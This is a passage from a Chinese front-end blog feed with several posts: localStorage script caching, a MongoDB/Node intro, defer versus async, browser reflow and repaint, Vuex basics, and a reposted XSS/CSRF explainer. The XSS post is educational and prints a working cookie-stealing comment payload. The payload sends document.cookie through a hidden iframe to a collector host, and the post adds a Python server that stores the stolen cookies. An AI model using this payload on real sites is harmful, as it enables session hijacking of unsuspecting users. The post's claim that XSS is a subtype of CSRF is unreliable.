<h2 id="此方案的优点"><a href="#此方案的优点" class="headerlink" title="此方案的优点"></a>此方案的优点</h2><p>对于传统的浏览器缓存（如COOKIE）, 用户主动触发的页面刷新行为（比如刷新按钮、右键刷新、F5等），会导致浏览器放弃本地缓存，使用协商缓存（304缓存），用了LS之后，可以完全避免这种情况，等效于无视用户主动刷新行为的本地强缓存。当LS+eval速度大于304协商速度时，LS方案具有统计上的正收益。</p>
<p>还有，缓存问题也绝不是一个页面的问题，网站很多页面之间会跳转访问，彼此之间也有共享的静态资源，基于url的缓存让跨页面之间缓存共享问题变得粗粒度。举个例子，有A、B两个页面，彼此有访问路径（比如百度首页和搜索结果页之间的访问），其中：</p>
<ul>
<li>A页面使用资源：a, b, c, d</li>
<li>B页面使用资源：a, b, c, e, f</li>
</ul>
<p>假设不考虑并发请求的优化，我们希望尽可能的打包，再假设A页面是主要入口，那么，最合理的方案可能就是a-b-c-d打包（设为[abcd]），e-f打包（设为[ef]），从而使得：</p>
<ul>
<li>A页面使用url：[abcd]</li>
<li>B页面使用url：[abcd]+[ef]</li>
<li>由于用户大多首次访问A页面，然后会跳转到B页面，所以访问A页面会很快，再跳转到B页面可以从缓存中使用[abcd]包，再只需加载[ef]包即可。为了更大的缓存利用率，我们让B页面复用A页面的url缓存，但多了一个不需要的d资源这也是合理的。也就是说，基于url的缓存利用可能在有些情况下会资源的冗余加载。想想那些通过url直接访问B页面的用户来说，无缓存情况下，页面加载的是[abcd]+[ef]两个资源包，既有冗余，又是两个请求，这并不是最理想的加载策略（这个方案是倾向于优化A页面展现的，虽然B页面首次展现不理想，但B页面大部分pv是从A页面导入，网站总体性能是更好的）。</li>
</ul>
<p>而使用combo服务+LS的情况就不同了，假设combo的url的形式是[a,b,c,…]，那么单独访问A、B页面的资源url就是：</p>
<ul>
<li>A页面使用url：[a,b,c,d]</li>
<li>B页面使用url：[a,b,d,e,f]<br>用户由A页面进入网站，加载[a,b,c,d]这个url，然后LS缓存4个资源，再跳转到B页面，缓存控制框架可以知道本地缓存了哪些，然后只发起[e,f]这个请求。其效果基本等效于浏览器基于URL的缓存。而对于那些没有通过A页面直接访问B页面的用户来说，B页面加载的是[a,b,d,e,f]，也是不错的合并策略。LS在这个时候就发挥了那么一点点优势。</li>
</ul>
<p>当然，这种优势还不够明显，最能展现LS优势的，其实是单页面应用。因为单页面应用需要完全有JS管理页面状态，并增量加载资源，用户也可能通过带有hash的url直接访问某个单页面中的虚拟页面，同一个页面会有很多种不同的资源请求组合，这个时候，唯有LS+combo才能很好的解决资源加载与缓存问题。对于这种情况，我有一个网站可以用于展示效果：</p>
<p>Scrat - webapp模块化开发体系<a href="http://scrat.io/#!/index" target="_blank" rel="external">http://scrat.io/#!/index</a></p>
<h2 id="方案存在的问题"><a href="#方案存在的问题" class="headerlink" title="方案存在的问题"></a>方案存在的问题</h2><p>首先，对SEO是不友好的。要进行SEO，必须直接输出完整HTML，因此必须让样式在头部以link标签加载。如果先输出HTML，后用js从本地缓存读取样式再插入，会出现严重的阻塞和闪烁问题，相信正常人是不会这么干的。</p>
<p>兼容性不太好，不支持LS的浏览器比例仍然很大。</p>
<p>在未来，HTTP2时代的到来应该会完美绝杀这种黑科技，因此，工程化的具体实施方法必然要与时俱进，不过工程化的方法论不会过时，无论在哪个时代，我们都应该全面、科学的分析工程问题，结合当前的浏览器环境和技术手段来做方案，保持网站的性能。</p>
<p>其次，引入localStorage中的缓存文件不像<script>标签插入JS那样可以自执行，因此需要一些技巧，常见的方法是写eval()函数，把所有的代码都执行出来，但是这有一个问题，就是不便于压缩。因此也可以用另一个方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line"><span class="keyword">var</span> code = <span class="string">'!function()&#123;'</span> + getCodeFromLocalStorage() + <span class="string">'\n&#125;();'</span>;</div><div class="line">script.appendChild(<span class="built_in">document</span>.createTextNode(code));</div><div class="line"><span class="built_in">document</span>.head.appendChild(script);</div></pre></td></tr></table></figure>
<p>容易出现安全问题，一旦有xss漏洞就会被人利用，将恶意代码注入到LS中导致即便修复了xss恶意代码也存在的问题。所以我们现在采用的策略是每次部署新版本就会清除全部缓存。这会导致缓存利用率的下降，不过至少还有部分浏览器缓存在呢，算是一个折中处理。</p>
</script></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先，localStorage的确是可以做JS以及CSS缓存的，详情可以通过F12看&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA5NDIzNzY1OQ==&amp;amp;mid=2735610010&amp;amp;idx=1&amp;amp;sn=67e3f0833f1097a279d850e2098956ff&amp;amp;scene=0#wechat_redirect&quot;&gt;http://mp.weixin.qq.com/s?__biz=MzA5NDIzNzY1OQ==&amp;amp;mid=2735610010&amp;amp;idx=1&amp;amp;sn=67e3f0833f1097a279d850e2098956ff&amp;amp;scene=0#wechat_redirect&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;按道理说这个机制是非常诱人的，毕竟localStorage可存储体积大，并且用户一旦开启便不容易清除，所以从工程师的角度来看这个工具非常适合缓存一些并不经常需要维护更新的脚本和样式文件。&lt;/p&gt;
&lt;p&gt;当然，假如要更新的话，就得好好设计一下更新机制，普通的资源请求，可以根据文件名+md5 &lt;a href=&quot;http://res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/moon32ebc4.js或者在资源链接后面加上特定的后缀http://1.ss.faisys.com/js/comm/fai.min.js?v=201612051739做标识来判断是否需要更新资源。如果用localStorage做，则需要一套新的缓存更新机制。&quot;&gt;http://res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/moon32ebc4.js或者在资源链接后面加上特定的后缀http://1.ss.faisys.com/js/comm/fai.min.js?v=201612051739做标识来判断是否需要更新资源。如果用localStorage做，则需要一套新的缓存更新机制。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;微信的做法是每个文件都单独维护一个localStorage变量，来记录版本号，从而由后台来判断是否需要更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>初识mongodb</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/20/%E5%88%9D%E8%AF%86mongodb/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/20/初识mongodb/</id>
    <published>2017-01-20T01:14:53.000Z</published>
    <updated>2017-02-04T01:45:13.138Z</updated>
    
    <content type="html"><![CDATA[<h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><p>传说中的非关系数据库，颠覆了我们在大学时学数据库时的三观，虽说那时并非所有的数据库都是关系型数据库，但起码有一统江湖的感觉。</p>
<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm i mongo</div></pre></td></tr></table></figure>
<p>另外，还有一个非常重要的步骤，要在命令行中执行 mongod –dbpath “D:\vue\vue-wechat\server”  D:\vue\vue-wechat\server换成需要启动服务的位置，也就是你项目的server文件夹。这个命令相当于打开MONGODB的服务界面，让其进入服务状态。</p>
<a id="more"></a>
<h2 id="server-JS维护"><a href="#server-JS维护" class="headerlink" title="server JS维护"></a>server JS维护</h2><p>```javascript<br>const mongodb = require(‘mongodb’);<br>const  server  = new mongodb.Server(‘localhost’, 27017, {auto_reconnect:true});<br>var  db = new mongodb.Db(‘XXXX’, server, {safe:true}); //XXXX可以改成任意名字</p>
<p>const hostname = ‘127.0.0.1’;<br>const port = 9001; //port注意不要和已启动的服务端口重合，比如PHP常用的9000，VUE常用的8080</p>
<p>http.createServer((req, res) =&gt; {<br>  var json;<br>  var _callbackName = req.url.substr(req.url.indexOf(‘=’) + 1);</p>
<p>  http.get(‘XXXXXXXX’, (response) =&gt; {<br>    response.setEncoding(‘utf8’);<br>    response.on(‘data’, (data) =&gt; {<br>     // json = data;<br>      res.end(_callbackName + “(“ + data + “)”);</p>
<pre><code>  res._tempData = data;

  db.open( (err, db) =&gt;{
        if (!err) {
            console.log(&apos;connect db&apos;);
            //数据库连接
            db.createCollection(&apos;test&apos;, { safe: true }, (err, collection) =&gt; {
                debugger
                if (err) {
                    console.log(err);
                } else {
                    var tmp1 = JSON.parse(res._tempData);
                    collection.insert([tmp1], { safe: true }, function(err, result) {
                        console.log(result);
                    });
                    /*collection.remove({title: &quot;world&quot;}, function(err, count) {
                        // console.log(count);
                    })*/
                    collection.find().toArray(function(err, docs) {
                        console.log(&apos;find&apos;);
                        console.log(docs);
                    });

                    db.close();
                    /*collection.findOne(function(err, doc) {
                        console.log(&apos;findOne&apos;);
                        console.log(doc);
                    });*/

                }

            });
        } else {
            console.log(err);
        }
  });

});  
</code></pre><p>  });<br>}).listen(port, hostname, () =&gt; {<br>  console.log(<code>Server running at http://${hostname}:${port}/</code>);<br>});</p>
<font color="red">总结一下，总的来说非常简单，不知效率如何，我的猜想，应该是比较适合层次较少的JSON数据结构。</font>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;mongodb&quot;&gt;&lt;a href=&quot;#mongodb&quot; class=&quot;headerlink&quot; title=&quot;mongodb&quot;&gt;&lt;/a&gt;mongodb&lt;/h3&gt;&lt;p&gt;传说中的非关系数据库，颠覆了我们在大学时学数据库时的三观，虽说那时并非所有的数据库都是关系型数据库，但起码有一统江湖的感觉。&lt;/p&gt;
&lt;h2 id=&quot;引入&quot;&gt;&lt;a href=&quot;#引入&quot; class=&quot;headerlink&quot; title=&quot;引入&quot;&gt;&lt;/a&gt;引入&lt;/h2&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;npm i mongo&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;另外，还有一个非常重要的步骤，要在命令行中执行 mongod –dbpath “D:\vue\vue-wechat\server”  D:\vue\vue-wechat\server换成需要启动服务的位置，也就是你项目的server文件夹。这个命令相当于打开MONGODB的服务界面，让其进入服务状态。&lt;/p&gt;
    
    </summary>
    
    
      <category term="后端" scheme="https://ganchengyuan1990.github.io/blog/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Js 载入defer和async方式的区别</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/19/Js-%E8%BD%BD%E5%85%A5defer%E5%92%8Casync%E6%96%B9%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/19/Js-载入defer和async方式的区别/</id>
    <published>2017-01-19T06:06:49.000Z</published>
    <updated>2017-01-19T06:07:30.385Z</updated>
    
    <content type="html"><![CDATA[<p>async加载完便执行，乱序的；defer会等到html解析完再执行，并且是顺序的。</p>
<ol>
<li>defer 和 async 在网络读取（下载）这块儿是一样的，都是异步的（相较于 HTML 解析）</li>
<li>它俩的差别在于脚本下载完之后何时执行，显然 defer 是最接近我们对于应用脚本加载和执行的要求的</li>
<li>关于 defer，此图未尽之处在于它是按照加载顺序执行脚本的，这一点要善加利用</li>
<li>async 则是一个乱序执行的主，反正对它来说脚本的加载和执行是紧紧挨着的，所以不管你声明的顺序如何，只要它加载完了就会立刻执行</li>
<li>仔细想想，async 对于应用脚本的用处不大，因为它完全不考虑依赖（哪怕是最低级的顺序执行），不过它对于那些可以不依赖任何脚本或不被任何脚本依赖的脚本来说却是非常合适的，最典型的例子：Google Analytics</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;async加载完便执行，乱序的；defer会等到html解析完再执行，并且是顺序的。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;defer 和 async 在网络读取（下载）这块儿是一样的，都是异步的（相较于 HTML 解析）&lt;/li&gt;
&lt;li&gt;它俩的差别在于脚本下载完之后何时执行，显然 
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>XSS和CSRF对比</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/19/XSS%E5%92%8CCSRF%E5%AF%B9%E6%AF%94/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/19/XSS和CSRF对比/</id>
    <published>2017-01-19T01:11:30.000Z</published>
    <updated>2017-02-04T01:44:11.126Z</updated>
    
    <content type="html"><![CDATA[<font color="grey">转载：<a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="external">https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/</a></font>

<h2 id="XSS：脚本中的不速之客"><a href="#XSS：脚本中的不速之客" class="headerlink" title="XSS：脚本中的不速之客"></a>XSS：脚本中的不速之客</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>
<p>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">    alert(<span class="string">"你关不掉我~"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line">&lt;!-- more --&gt;</div><div class="line"></div><div class="line"></div><div class="line">跨站脚本注入的信息收集服务器</div><div class="line"></div><div class="line">"""javascript</div><div class="line"><span class="keyword">import</span> bottle</div><div class="line"></div><div class="line">app = bottle.Bottle()</div><div class="line">plugin = bottle.ext.sqlite.Plugin(dbfile=<span class="string">'/var/db/myxss.sqlite'</span>)</div><div class="line">app.install(plugin)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/myxss/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(cookies, db)</span>:</span></div><div class="line">    SQL = <span class="string">'INSERT INTO "myxss" ("cookies") VALUES (?)'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        db.execute(SQL, cookies)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>然后在某一个页面的评论中注入这段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt;  包起来放在评论中</span></div><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">    <span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">    hideFrame.height = <span class="number">0</span>;</div><div class="line">    hideFrame.width = <span class="number">0</span>;</div><div class="line">    hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">    hideFrame.src = xssURI;</div><div class="line">    <span class="comment">// 开工</span></div><div class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure></p>
<font color="red">个人总结：XSS是CSRF中的一种，是特指通过执行JS脚本来进行的攻击。CSRF则方式更多，比如通过代码中的逻辑问题去进行攻击，黑客通过伪装成用户进行攻击。</font>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;grey&quot;&gt;转载：&lt;a href=&quot;https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://blog.tonyse
    
    </summary>
    
    
      <category term="网络相关" scheme="https://ganchengyuan1990.github.io/blog/tags/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>html render &amp; paint（重排和重绘）</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/18/html-render-paint/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/18/html-render-paint/</id>
    <published>2017-01-18T03:05:38.000Z</published>
    <updated>2017-02-04T01:44:45.554Z</updated>
    
    <content type="html"><![CDATA[<p>首先，先吐槽一下weex学习社区的内容真的非常不全面，自学很难，优点是调试相对简单，暂时放一放，以后有空再看看。</p>
<hr>
<p>接下来进入正题，讲一讲昨天刚复习的有关<font color="red">浏览器页面渲染</font>的知识点。</p>
<p>##repaint、reflow/relayout、restyle</p>
<p>这四个概念分别代表什么？先来看一张图，了解一下浏览器页面的渲染过程<br><img src="http://images.cnitblog.com/blog/595796/201408/211743255813505.png"></p>
<a id="more"></a>
<font color="red">这里要注意的是：</font>要生成Dom Tree和Css Tree以后才会生成render tree，然后进行绘制(paint)。<br><br>1. 首先，浏览器解析HTML源码构建DOM树，在DOM树中，每个HTML标签都有对应的节点，并且在介于两个标签中间的文字块也对应一个text节点。DOM树的根节点是documentElement，也就是<html>标签；<br>2. 然后，浏览器对CSS代码进行解析，一些当前浏览器不能识别的CSS hack写法（如-moz-/-webkit等前缀，以及IE下的/_等）将会被忽略。CSS样式的优先级如下：最低的是浏览器的默认样式，然后是通过<link>、import引入的外部样式和行内样式，最高级的是直接写在标签的style属性中的样式；<br>3. 随后将进入非常有趣的环节-构建渲染树。渲染树跟DOM树结构相似但并不完全匹配。渲染树会识别样式，所以如果通过设置display:none隐藏的标签是不会被渲染树引入的。同样的规则适用于<head>标签以及其包含的所有内容。另外，在渲染树中可能存在多个渲染节点（渲染树中的节点称为渲染节点）映射为一个DOM标签，例如，多行文字的<p>标签中的每一行文字都会被视为一个单独的渲染节点。渲染树的一个节点也称为frame-结构体，或者盒子-box（与CSS盒子类似）。每个渲染节点都具有CSS盒子的属性，如width、height、border、margin等；<br>4. 最后，等待渲染树构建完毕后，浏览器便开始将渲染节点一一绘制-paint到屏幕上。。<br><br>OK，接下来看一个例子<br><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Beautiful page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    </div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></div><div class="line">    Once upon a time there was </div><div class="line">    a looong paragraph...</div><div class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span></div><div class="line">    Secret message</div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">  </div><div class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"..."</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">  ...</div><div class="line"> </div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure><br><br>这个html对应的DOM结构如下：<br><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">documentElement (html)</div><div class="line">    head</div><div class="line">        title</div><div class="line">    body</div><div class="line">        p</div><div class="line">            [text node]</div><div class="line">        </div><div class="line">        div </div><div class="line">            [text node]</div><div class="line">        </div><div class="line">        div</div><div class="line">            img</div><div class="line">        </div><div class="line">        ...</div></pre></td></tr></table></figure><br><br>由于渲染树会忽略head内容和隐藏的节点，并且会将</p><p>中的多行文字按行数映射为单独的渲染节点，故构建完成的渲染树结构如下：<br><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root (RenderView)</div><div class="line">    body</div><div class="line">        p</div><div class="line">            line 1</div><div class="line">        line 2</div><div class="line">        line 3</div><div class="line">        ...</div><div class="line">        </div><div class="line">    div</div><div class="line">        img</div><div class="line">        </div><div class="line">    ...</div></pre></td></tr></table></figure><br><br><br><br>## 重绘-repaint和回流（重排）-reflow<br><br>同一时间内至少存在一个页面初始化layout行为和一个绘制行为（除非你的页面是空白页-blank）。在此之后，改变任何影响构造渲染树的行为都会触发以下一种或者多种动作：<br><br>1.  渲染树的部分或者全部将需要重新构造并且渲染节点的大小需要重新计算。这个过程叫做回流-reflow，或者layout，或者layouting（靠，能不能愉快的翻译了，是不是还来个过去式啊?!），或者relayout（这词是原文作者杜撰的，为了标题中多个“R”）。浏览器中至少存在一个reflow行为-即页面的初始化layout；<br>2.  屏幕的部分区域需要进行更新，要么是因为节点的几何结构改变，要么是因为格式改变，如背景色的变化。屏幕的更新行为称作重绘-repaint，或者redraw。<br><br><br><br>## 如何减少重绘和回流<br>减少因为重绘和回流引起的糟糕用户体验的本质是尽量减少重绘和回流，减少样式信息的set行为。可以通过以下几点来优化：<br>1.  不要逐个修改多个样式。对于静态样式来说，最明智和易维护的代码是通过改变classname来控制样式；而对于动态样式来说，通过一次修改节点的cssText来代替样式的逐个改变。<br>2.  “离线”处理多个DOM操作。“离线”的意思是将需要进行的DOM操作脱离DOM树，比如：<br><em> 通过documentFragment集中处理临时操作；
</em> 将需要更新的节点克隆，在克隆节点上进行更新操作，然后把原始节点替换为克隆节点；<br>* 先通过设置display:none将节点隐藏（此时出发一次回流和重绘），然后对隐藏的节点进行100个操作（这些操作都会单独触发回流和重绘），完毕后将节点的display改回原值（此时再次触发一次回流和重绘）。通过这种方法，将100次回流和重绘缩减为2次，大大减少了消耗<br>3. 不要过多进行重复的样式计算操作。如果你需要重复利用一个静态样式值，可以只计算一次，用一个局部变量储存，然后利用这个局部变量进行相关操作。<br>4. 总之，当你在打算改变样式时，首先考虑一下渲染树的机制，并且评估一下你的操作会引发多少刷新渲染树的行为。例如，我们知道一个绝对定位的节点是会脱离文档流，所以当对此节点应用动画时不会对其他节点产生很大影响，当绝对定位的节点置于其他节点上层时，其他节点只会触发重绘，而不会触发回流。<br><br><br><br>## restyle到底是什么？<br>仔细的朋友会发现，到现在我们也没具体说restyle的情况，<font color="red">restyle指的是没有几何结构改变的渲染树变化。也就是说restyle和reflow是一个层次的概念，完成以后都会引发repaint!</font>

</p><p><br></p>
<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>重新计算渲染树的行为被Mozilla称为回流-reflow，被其他浏览器称为layout；<br>将重新计算后的渲染树更新到屏幕的行为叫做重绘-repaint，或者redraw（in IE/DynaTrace）；</p>
</head></html>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先，先吐槽一下weex学习社区的内容真的非常不全面，自学很难，优点是调试相对简单，暂时放一放，以后有空再看看。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;接下来进入正题，讲一讲昨天刚复习的有关&lt;font color=red&gt;浏览器页面渲染&lt;/font&gt;的知识点。&lt;/p&gt;
&lt;p&gt;##repaint、reflow/relayout、restyle&lt;/p&gt;
&lt;p&gt;这四个概念分别代表什么？先来看一张图，了解一下浏览器页面的渲染过程&lt;br&gt;&lt;img src=&quot;http://images.cnitblog.com/blog/595796/201408/211743255813505.png&quot; /&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="css" scheme="https://ganchengyuan1990.github.io/blog/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>vuex初探</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/17/vuex%E5%88%9D%E6%8E%A2/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/17/vuex初探/</id>
    <published>2017-01-17T02:27:29.000Z</published>
    <updated>2017-02-04T01:44:19.577Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Vuex的作用是什么"><a href="#Vuex的作用是什么" class="headerlink" title="Vuex的作用是什么"></a>Vuex的作用是什么</h3><p>Vuex主要用来进行状态管理，我的理解就是当你的VUE项目大到一定程度以后，需要一个帮手来帮助你进行组件管理，尤其是多层次的组件进行信息交互时，如果没有这样一个工具，就得维护公共变量或者一层一层传递参数，这个过程是非常令人不愉悦的。</p>
<h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> actions <span class="keyword">from</span> <span class="string">'./actions'</span>; <span class="comment">//改变状态都得通过这里的方法</span></div><div class="line"><span class="keyword">import</span> * <span class="keyword">as</span> getters <span class="keyword">from</span> <span class="string">'./getters'</span>; <span class="comment">//获取状态值的方法</span></div></pre></td></tr></table></figure>
<h2 id="store对象"><a href="#store对象" class="headerlink" title="store对象"></a>store对象</h2><p>这个对象就是Vuex创建的实例对象，是重点需要学习的内容。</p>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">const</span> store = &#123;</div><div class="line">	<span class="comment">//state对象维护具体状态值</span></div><div class="line">    state: &#123;</div><div class="line">        <span class="attr">isInitData</span>: <span class="literal">true</span>, <span class="comment">//首次刷新页面</span></div><div class="line">    &#125;,</div><div class="line">    <span class="comment">/**</span></div><div class="line">     * vuex 2.0 action should be await 